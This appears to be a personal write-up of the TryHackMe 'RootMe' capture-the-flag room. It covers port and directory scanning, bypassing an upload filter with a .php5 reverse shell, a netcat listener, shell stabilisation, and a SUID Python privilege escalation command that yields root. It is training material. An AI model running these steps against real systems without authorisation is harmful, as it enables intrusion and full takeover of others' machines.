# RootMe Room
https://tryhackme.com/room/rrootme

export target=10.10.138.30

## Port / Service Scans
1. `nmap -sC -sV -vv <ip> | tee nmap/initial-scan`
2. `nmap -p- --min-rate 10000 -v <ip> | tee nmap/quick-scan`

Found:
- 80: Apache 2.4.29
- 22: SSH

## Directory & File Bruteforce
`gobuster dir -u http://<ip>/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100`

Found:
- Hidden directory called "/panel/"
- Directory called "/uploads"/

## Exploiting
/panel contains upload screen
tried uploading .php reverse shell - didn't work
tried changing mimetype before submitting - didn't work
tried changing file extension from .php -> .php5 - Worked

Accessed file from /uploads and used netcat to listen

`nc -lvnp 9989` Netcat Listener  

### Stabilise NC term
`python3 -c 'import pty;pty.spawn("/bin/bash")'` on target  
`export TERM=xterm` on target  
Then I backgrounded ther shell using CTRL+Z and ran `stty raw -echo;fg` on my own machine to gain access to www-user

### Privesc
Checked system for SUID bit binaries  
`find / -user root -perm /4000`

Found `/usr/bin/python`

Checked GTFO bins for Python: https://gtfobins.github.io/gtfobins/python/#suid

ran `./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` and gained root privs
